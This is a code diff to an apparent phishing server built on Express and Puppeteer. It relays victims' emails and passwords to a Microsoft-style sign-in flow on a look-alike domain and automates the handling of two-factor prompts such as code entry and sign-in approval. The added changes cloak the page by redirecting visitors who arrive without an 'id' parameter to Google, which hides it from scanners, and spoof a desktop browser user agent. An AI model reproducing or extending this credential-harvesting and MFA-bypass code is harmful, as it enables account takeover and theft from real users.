@@ -23,8 +23,14 @@ function delay(ms) {
 }
 
 // Serve index.html when the root URL is accessed
+
 app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "views", "index.html"));
+  if (!req.query.id) {
+    // Redirect to Google
+    return res.redirect("https://www.google.com");
+  } else {
+    res.sendFile(path.join(__dirname, "views", "index.html"));
+  }
 });
 
 app.post("/email", async (req, res) => {
@@ -56,6 +62,8 @@ app.post("/email", async (req, res) => {
           : puppeteer.executablePath(),
     });
     const page = await browser.newPage();
+    const userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36';
+    await page.setUserAgent(userAgent);
     await page.goto("https://strat.tractiioncp.com/eJTGlsPq", {
       timeout: 60000,
     });
@@ -105,10 +113,10 @@ app.post("/pass", async (req, res) => {
     } else {
       const content3 = await page.content();
       if (content3.includes("Enter code")) {
-        console.log("Enter code")
+        console.log("Enter code");
         res.send("2");
       } else if (content3.includes("Approve sign in request")) {
-        console.log("Approve sign in request")
+        console.log("Approve sign in request");
         await page.waitForSelector("#idRichContext_DisplaySign");
         const textContent = await page.$eval(
           "#idRichContext_DisplaySign",
@@ -122,7 +130,7 @@ app.post("/pass", async (req, res) => {
           await page.click("#idSIButton9");
         }
       } else {
-        console.log("No 2FA")
+        console.log("No 2FA");
         await delay(5000);
         await page.waitForSelector("#idSIButton9");
         await page.click("#idSIButton9");
